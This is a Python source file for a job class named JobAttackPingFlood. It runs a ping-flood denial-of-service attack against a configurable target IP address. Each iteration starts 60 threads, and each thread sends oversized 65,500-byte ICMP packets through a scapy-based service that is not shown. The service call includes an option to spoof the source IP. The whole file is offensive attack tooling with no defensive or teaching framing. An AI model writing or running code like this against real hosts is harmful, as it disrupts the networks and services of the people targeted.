import threading
import time
from jobs.abstract_job import AbstractJob
from services.service_scapy import ServiceScapy
from injectable import injectable, autowired, Autowired


@injectable
class JobAttackPingFlood(AbstractJob):
    @autowired
    def __init__(self, service_scapy: Autowired(ServiceScapy)):
        super().__init__()
        self.service_scapy = service_scapy
        self.target_ip_address = None

    def set_target(self, target_ip_address: str):
        self.target_ip_address = target_ip_address

    def clean_target(self):
        self.set_target(None)

    def launch_attack_in_thread(self, thread_index: int):
        print('JobAttackPingFlood.launch_attack_in_thread(): Started thread ' + str(thread_index))
        self.service_scapy.attack_ping_flood(self.target_ip_address, number_of_packets_to_send=3, size_of_packet=65500, spoof_source_ip=False)
        print('JobAttackPingFlood.launch_attack_in_thread(): Finished thread ' + str(thread_index))

    def job_iteration(self):
        print('JobAttackPingFlood.job_iteration(): Started')

        # Early stop if invalid IP present
        if self.target_ip_address is None:
            print('JobAttackPingFlood.job_iteration(): Target IP was set invalid ' + str(self.target_ip_address))
            self.stop()
            return

        # Launch separate threads with attacks
        for thread_index in range(0, 60):
            thread = threading.Thread(target=self.launch_attack_in_thread, args=[thread_index])
            thread.start()
        time.sleep(2)

        print('JobAttackPingFlood.job_iteration(): Finished')
